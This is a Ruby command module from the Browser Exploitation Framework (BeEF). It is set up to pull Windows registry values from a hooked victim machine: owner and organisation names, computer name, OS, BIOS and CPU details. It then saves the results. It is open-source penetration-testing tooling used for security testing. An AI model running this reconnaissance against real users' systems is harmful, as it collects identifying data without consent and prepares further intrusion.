#
# Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (BeEF) - http://beefproject.com
# See the file 'doc/COPYING' for copying permission
#
class Get_registry_keys < BeEF::Core::Command

	def self.options
		return [
			{ 'name'=>'key_paths', 'ui_label' => 'Key(s)', 'description' => 'Enter registry keys. Note: each key requires its own line', 'type'=>'textarea', 'width' => '500px', 'height' => '350px', 'value'=>'HKLM\\SYSTEM\\CurrentControlSet\\Control\\SystemInformation\\SystemProductName
HKLM\\SYSTEM\\CurrentControlSet\\Control\\SystemInformation\\SystemManufacturer
HKLM\\SYSTEM\\CurrentControlSet\\Control\\SystemInformation\\BIOSVersion
HKLM\\SYSTEM\\CurrentControlSet\\Control\\SystemInformation\\BIOSReleaseDate
HKLM\\SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ComputerName\\ComputerName
HKLM\\SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ActiveComputerName\\ComputerName
HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\RegisteredOwner
HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\RegisteredOrganization
HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProductName
HKLM\\HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0\\ProcessorNameString
HKLM\\HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0\\Identifier'
}
		]
	end

	def post_execute
		content = {}
		content['result'] = @datastore['key_values'] if not @datastore['key_values'].nil?
		content['fail'] = 'No data was returned.' if content.empty?
		save content
	end
  
end

